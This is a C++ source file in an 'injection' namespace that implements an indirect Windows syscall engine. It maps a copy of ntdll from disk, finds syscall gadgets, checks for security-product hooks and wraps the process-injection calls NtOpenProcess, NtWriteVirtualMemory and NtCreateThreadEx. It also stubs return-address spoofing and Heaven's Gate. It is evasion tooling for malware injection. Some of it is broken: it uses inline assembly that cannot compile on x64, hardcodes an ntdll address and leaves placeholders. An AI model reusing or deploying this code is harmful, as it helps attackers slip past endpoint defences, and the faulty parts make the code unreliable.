// EnhancedDirectSyscall.cpp - Advanced Indirect System Call Implementation
#include "../include/DirectSyscall.h"
#include <Windows.h>
#include <winternl.h>
#include <iostream>
#include <map>
#include <string>
#include <vector>
#include <algorithm>
#include <cstring>
#include <memory>
#include <psapi.h>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "psapi.lib")

// Define NT status codes
#ifndef STATUS_NOT_IMPLEMENTED
#define STATUS_NOT_IMPLEMENTED ((NTSTATUS)0xC0000002L)
#endif

#ifndef STATUS_NOT_SUPPORTED
#define STATUS_NOT_SUPPORTED ((NTSTATUS)0xC00000BBL)
#endif

#ifdef _WIN64

namespace injection {

namespace {

// Logging
void LogDirectSyscall(const std::string& message) {
    std::cerr << "[EnhancedDirectSyscall] " << message << std::endl;
}

// Assembly stub for indirect syscalls
extern "C" NTSTATUS IndirectSyscallStub(DWORD syscallNumber, PVOID stackArgs);

// Assembly implementation (would be in separate .asm file in production)
__declspec(naked) NTSTATUS IndirectSyscallStub(DWORD syscallNumber, PVOID stackArgs) {
    __asm {
        mov r10, rcx        // Move first parameter to r10 (Windows x64 convention)
        mov eax, edx        // Move syscall number to eax

        // Load remaining arguments from stack
        mov rcx, [r8]       // Arg 1
        mov rdx, [r8 + 8]   // Arg 2
        mov r8, [r8 + 16]   // Arg 3
        mov r9, [r8 + 24]   // Arg 4

        // Find a clean syscall instruction in ntdll
        mov r11, 0x00007FFB12340000  // This would be dynamically resolved
        add r11, 0x12          // Offset to syscall instruction
        jmp r11                // Jump to syscall; ret sequence
    }
}

} // namespace

class EnhancedDirectSyscallEngine {
private:
    struct SyscallEntry {
        DWORD number = 0;
        void* stub = nullptr;
        void* cleanSyscallAddr = nullptr;  // Address of clean syscall instruction
        bool isHooked = false;
    };

    std::map<std::string, SyscallEntry> syscallEntries;
    std::vector<void*> allocatedStubs;
    PVOID ntdllBase = nullptr;
    SIZE_T ntdllSize = 0;
    PVOID cleanNtdllCopy = nullptr;
    BOOL is64bit;
    DWORD osVersion;
    DWORD osBuildNumber;
    bool ready;

    // Gadget addresses for indirect execution
    PVOID syscallGadget = nullptr;     // Address of syscall; ret
    PVOID sysenterGadget = nullptr;    // Address of sysenter; ret
    PVOID int2eGadget = nullptr;       // Address of int 2e; ret

public:
    EnhancedDirectSyscallEngine() : ready(false) {
        ready = Initialize();
    }

    ~EnhancedDirectSyscallEngine() {
        CleanupStubs();
        if (cleanNtdllCopy) {
            VirtualFree(cleanNtdllCopy, 0, MEM_RELEASE);
        }
    }

    bool Initialize() {
        CleanupStubs();
        syscallEntries.clear();
        ready = false;

        // Detect architecture
#ifdef _WIN64
        is64bit = TRUE;
#else
        is64bit = FALSE;
        LogDirectSyscall("Direct syscall engine requires a 64-bit build.");
        return false;
#endif

        // Get OS version for correct syscall numbers
        if (!DetectOSVersion()) {
            LogDirectSyscall("Failed to detect operating system version.");
            return false;
        }

        // Load clean copy of ntdll from disk
        if (!LoadCleanNtdll()) {
            LogDirectSyscall("Failed to load clean ntdll copy.");
            return false;
        }

        // Find syscall gadgets
        if (!FindSyscallGadgets()) {
            LogDirectSyscall("Failed to find syscall gadgets.");
            return false;
        }

        // Populate syscall numbers from clean ntdll
        if (!PopulateSyscallNumbers()) {
            LogDirectSyscall("Failed to populate syscall table.");
            return false;
        }

        // Create indirect syscall stubs
        if (!CreateIndirectStubs()) {
            LogDirectSyscall("Failed to create indirect syscall stubs.");
            return false;
        }

        ready = true;
        LogDirectSyscall("Enhanced Direct Syscall engine initialized successfully.");
        return true;
    }

    bool IsReady() const {
        return ready;
    }

private:
    bool DetectOSVersion() {
        osVersion = 0;
        osBuildNumber = 0;

        using RtlGetVersion_t = NTSTATUS(WINAPI*)(PRTL_OSVERSIONINFOW);
        HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
        if (!hNtdll) {
            return false;
        }

        ntdllBase = hNtdll;

        // Get ntdll size
        MODULEINFO modInfo;
        if (GetModuleInformation(GetCurrentProcess(), hNtdll, &modInfo, sizeof(modInfo))) {
            ntdllSize = modInfo.SizeOfImage;
        }

        auto RtlGetVersion = reinterpret_cast<RtlGetVersion_t>(
            GetProcAddress(hNtdll, "RtlGetVersion"));

        RTL_OSVERSIONINFOW versionInfo = {};
        versionInfo.dwOSVersionInfoSize = sizeof(versionInfo);

        if (RtlGetVersion && NT_SUCCESS(RtlGetVersion(&versionInfo))) {
            osVersion = versionInfo.dwMajorVersion;
            osBuildNumber = versionInfo.dwBuildNumber;
            return true;
        }

        return false;
    }

    bool LoadCleanNtdll() {
        // Map a clean copy of ntdll from disk to avoid hooks
        wchar_t ntdllPath[MAX_PATH];
        GetSystemDirectoryW(ntdllPath, MAX_PATH);
        wcscat_s(ntdllPath, L"\\ntdll.dll");

        HANDLE hFile = CreateFileW(ntdllPath, GENERIC_READ, FILE_SHARE_READ,
                                  NULL, OPEN_EXISTING, 0, NULL);
        if (hFile == INVALID_HANDLE_VALUE) {
            return false;
        }

        DWORD fileSize = GetFileSize(hFile, NULL);
        cleanNtdllCopy = VirtualAlloc(NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

        if (!cleanNtdllCopy) {
            CloseHandle(hFile);
            return false;
        }

        DWORD bytesRead;
        if (!ReadFile(hFile, cleanNtdllCopy, fileSize, &bytesRead, NULL)) {
            VirtualFree(cleanNtdllCopy, 0, MEM_RELEASE);
            cleanNtdllCopy = nullptr;
            CloseHandle(hFile);
            return false;
        }

        CloseHandle(hFile);

        // Change memory protection to executable
        DWORD oldProtect;
        VirtualProtect(cleanNtdllCopy, fileSize, PAGE_EXECUTE_READ, &oldProtect);

        LogDirectSyscall("Clean ntdll loaded successfully.");
        return true;
    }

    bool FindSyscallGadgets() {
        if (!ntdllBase || !ntdllSize) {
            return false;
        }

        PBYTE base = (PBYTE)ntdllBase;

        // Search for syscall; ret (0F 05 C3)
        for (SIZE_T i = 0; i < ntdllSize - 3; i++) {
            if (base[i] == 0x0F && base[i + 1] == 0x05 && base[i + 2] == 0xC3) {
                syscallGadget = &base[i];
                LogDirectSyscall("Found syscall gadget at offset: " +
                               std::to_string(i));
                break;
            }
        }

        // Search for int 2e; ret (CD 2E C3) - alternative syscall method
        for (SIZE_T i = 0; i < ntdllSize - 3; i++) {
            if (base[i] == 0xCD && base[i + 1] == 0x2E && base[i + 2] == 0xC3) {
                int2eGadget = &base[i];
                LogDirectSyscall("Found int 2e gadget at offset: " +
                               std::to_string(i));
                break;
            }
        }

        return syscallGadget != nullptr;
    }

    bool PopulateSyscallNumbers() {
        if (!cleanNtdllCopy) {
            return false;
        }

        // Parse clean ntdll to extract syscall numbers
        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)cleanNtdllCopy;
        PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((PBYTE)cleanNtdllCopy +
                                                          dosHeader->e_lfanew);
        PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)cleanNtdllCopy +
            ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

        PDWORD functions = (PDWORD)((PBYTE)cleanNtdllCopy + exportDir->AddressOfFunctions);
        PDWORD names = (PDWORD)((PBYTE)cleanNtdllCopy + exportDir->AddressOfNames);
        PWORD ordinals = (PWORD)((PBYTE)cleanNtdllCopy + exportDir->AddressOfNameOrdinals);

        for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
            char* functionName = (char*)cleanNtdllCopy + names[i];

            // Only interested in Nt/Zw functions
            if (strncmp(functionName, "Nt", 2) != 0 && strncmp(functionName, "Zw", 2) != 0) {
                continue;
            }

            PVOID functionAddress = (PBYTE)cleanNtdllCopy + functions[ordinals[i]];

            // Extract syscall number from function
            // Typical pattern: mov eax, syscall_number
            PBYTE func = (PBYTE)functionAddress;
            if (func[0] == 0x4C && func[1] == 0x8B && func[2] == 0xD1) { // mov r10, rcx
                if (func[3] == 0xB8) { // mov eax, imm32
                    DWORD syscallNumber = *(DWORD*)&func[4];

                    SyscallEntry entry;
                    entry.number = syscallNumber;
                    entry.cleanSyscallAddr = syscallGadget;

                    // Check if the function is hooked in the loaded ntdll
                    entry.isHooked = IsFunctionHooked(functionName);

                    syscallEntries[functionName] = entry;
                }
            }
        }

        LogDirectSyscall("Populated " + std::to_string(syscallEntries.size()) +
                        " syscall entries.");
        return !syscallEntries.empty();
    }

    bool IsFunctionHooked(const std::string& functionName) {
        PVOID loadedFunc = GetProcAddress((HMODULE)ntdllBase, functionName.c_str());
        if (!loadedFunc) return false;

        PBYTE bytes = (PBYTE)loadedFunc;

        // Check for common hook patterns
        // JMP instruction
        if (bytes[0] == 0xE9 || bytes[0] == 0xEB) {
            return true;
        }

        // PUSH + RET (push address; ret)
        if (bytes[0] == 0x68 && bytes[5] == 0xC3) {
            return true;
        }

        // MOV + JMP (mov rax, address; jmp rax)
        if (bytes[0] == 0x48 && bytes[1] == 0xB8) {
            return true;
        }

        // INT3 breakpoint
        if (bytes[0] == 0xCC) {
            return true;
        }

        return false;
    }

    bool CreateIndirectStubs() {
        // Allocate memory for syscall stubs
        SIZE_T stubSize = 4096; // Page size
        PVOID stubMemory = VirtualAlloc(NULL, stubSize, MEM_COMMIT | MEM_RESERVE,
                                       PAGE_EXECUTE_READWRITE);
        if (!stubMemory) {
            return false;
        }

        allocatedStubs.push_back(stubMemory);

        PBYTE currentStub = (PBYTE)stubMemory;

        for (auto& [name, entry] : syscallEntries) {
            // Create indirect syscall stub for each function
            entry.stub = CreateSingleIndirectStub(currentStub, entry.number);
            currentStub += 64; // Each stub is ~64 bytes
        }

        // Change protection to execute-read
        DWORD oldProtect;
        VirtualProtect(stubMemory, stubSize, PAGE_EXECUTE_READ, &oldProtect);

        return true;
    }

    PVOID CreateSingleIndirectStub(PBYTE stubLocation, DWORD syscallNumber) {
        PBYTE stub = stubLocation;
        size_t i = 0;

        // mov r10, rcx
        stub[i++] = 0x4C; stub[i++] = 0x8B; stub[i++] = 0xD1;

        // mov eax, syscallNumber
        stub[i++] = 0xB8;
        *(DWORD*)&stub[i] = syscallNumber;
        i += 4;

        // Load address of clean syscall gadget into r11
        stub[i++] = 0x49; stub[i++] = 0xBB; // mov r11, imm64
        *(PVOID*)&stub[i] = syscallGadget;
        i += 8;

        // jmp r11 (indirect jump to syscall gadget)
        stub[i++] = 0x41; stub[i++] = 0xFF; stub[i++] = 0xE3;

        return stubLocation;
    }

    void CleanupStubs() {
        for (auto stub : allocatedStubs) {
            if (stub) {
                VirtualFree(stub, 0, MEM_RELEASE);
            }
        }
        allocatedStubs.clear();
    }

public:
    // Get syscall stub for a specific function
    template<typename T>
    T GetSyscallStub(const std::string& functionName) {
        auto it = syscallEntries.find(functionName);
        if (it != syscallEntries.end() && it->second.stub) {
            return reinterpret_cast<T>(it->second.stub);
        }
        return nullptr;
    }

    // Execute indirect syscall
    template<typename ReturnType, typename... Args>
    ReturnType IndirectSyscall(const std::string& functionName, Args... args) {
        auto it = syscallEntries.find(functionName);
        if (it == syscallEntries.end() || !it->second.stub) {
            LogDirectSyscall("Syscall not found: " + functionName);
            return (ReturnType)STATUS_NOT_IMPLEMENTED;
        }

        // Call the indirect syscall stub
        auto stub = reinterpret_cast<ReturnType(*)(Args...)>(it->second.stub);
        return stub(args...);
    }

    // Check if a syscall is hooked
    bool IsSyscallHooked(const std::string& functionName) {
        auto it = syscallEntries.find(functionName);
        if (it != syscallEntries.end()) {
            return it->second.isHooked;
        }
        return false;
    }

    // Return address spoofing for syscalls
    template<typename ReturnType, typename... Args>
    ReturnType SpoofedSyscall(const std::string& functionName, PVOID spoofedReturn, Args... args) {
        // This would use stack manipulation to spoof the return address
        // Implementation requires assembly code

        // Save original return address
        PVOID originalReturn = _ReturnAddress();

        // Temporarily modify stack to show spoofed return
        // [Assembly implementation needed]

        // Execute syscall
        ReturnType result = IndirectSyscall<ReturnType>(functionName, args...);

        // Restore original return
        // [Assembly implementation needed]

        return result;
    }

    // Heavens Gate - 32-bit to 64-bit transition
    bool EnableHeavensGate() {
#ifndef _WIN64
        // Implementation for 32-bit processes to execute 64-bit syscalls
        // This involves segment switching from 0x23 to 0x33
        __asm {
            push 0x33
            call $+5
            add dword ptr [esp], 5
            retf
            // Now in 64-bit mode
        }
#endif
        return true;
    }
};

// Global instance
static std::unique_ptr<EnhancedDirectSyscallEngine> g_SyscallEngine;

// Public API
bool InitializeDirectSyscall() {
    if (!g_SyscallEngine) {
        g_SyscallEngine = std::make_unique<EnhancedDirectSyscallEngine>();
    }
    return g_SyscallEngine->IsReady();
}

bool IsDirectSyscallReady() {
    return g_SyscallEngine && g_SyscallEngine->IsReady();
}

// Wrapper functions for common syscalls
NTSTATUS DirectNtCreateFile(
    PHANDLE FileHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PIO_STATUS_BLOCK IoStatusBlock,
    PLARGE_INTEGER AllocationSize,
    ULONG FileAttributes,
    ULONG ShareAccess,
    ULONG CreateDisposition,
    ULONG CreateOptions,
    PVOID EaBuffer,
    ULONG EaLength
) {
    if (!g_SyscallEngine) {
        InitializeDirectSyscall();
    }

    return g_SyscallEngine->IndirectSyscall<NTSTATUS>(
        "NtCreateFile",
        FileHandle, DesiredAccess, ObjectAttributes, IoStatusBlock,
        AllocationSize, FileAttributes, ShareAccess, CreateDisposition,
        CreateOptions, EaBuffer, EaLength
    );
}

NTSTATUS DirectNtOpenProcess(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PCLIENT_ID ClientId
) {
    if (!g_SyscallEngine) {
        InitializeDirectSyscall();
    }

    return g_SyscallEngine->IndirectSyscall<NTSTATUS>(
        "NtOpenProcess",
        ProcessHandle, DesiredAccess, ObjectAttributes, ClientId
    );
}

NTSTATUS DirectNtAllocateVirtualMemory(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
) {
    if (!g_SyscallEngine) {
        InitializeDirectSyscall();
    }

    return g_SyscallEngine->IndirectSyscall<NTSTATUS>(
        "NtAllocateVirtualMemory",
        ProcessHandle, BaseAddress, ZeroBits, RegionSize,
        AllocationType, Protect
    );
}

NTSTATUS DirectNtWriteVirtualMemory(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T BufferSize,
    PSIZE_T NumberOfBytesWritten
) {
    if (!g_SyscallEngine) {
        InitializeDirectSyscall();
    }

    return g_SyscallEngine->IndirectSyscall<NTSTATUS>(
        "NtWriteVirtualMemory",
        ProcessHandle, BaseAddress, Buffer, BufferSize, NumberOfBytesWritten
    );
}

NTSTATUS DirectNtProtectVirtualMemory(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
) {
    if (!g_SyscallEngine) {
        InitializeDirectSyscall();
    }

    return g_SyscallEngine->IndirectSyscall<NTSTATUS>(
        "NtProtectVirtualMemory",
        ProcessHandle, BaseAddress, RegionSize, NewProtect, OldProtect
    );
}

NTSTATUS DirectNtCreateThreadEx(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartAddress,
    PVOID Parameter,
    ULONG Flags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
) {
    if (!g_SyscallEngine) {
        InitializeDirectSyscall();
    }

    return g_SyscallEngine->IndirectSyscall<NTSTATUS>(
        "NtCreateThreadEx",
        ThreadHandle, DesiredAccess, ObjectAttributes, ProcessHandle,
        StartAddress, Parameter, Flags, ZeroBits, StackSize,
        MaximumStackSize, AttributeList
    );
}

// Check if a specific syscall is hooked
bool IsSyscallHooked(const std::string& functionName) {
    if (!g_SyscallEngine) {
        InitializeDirectSyscall();
    }

    return g_SyscallEngine->IsSyscallHooked(functionName);
}

} // namespace injection

#endif // _WIN64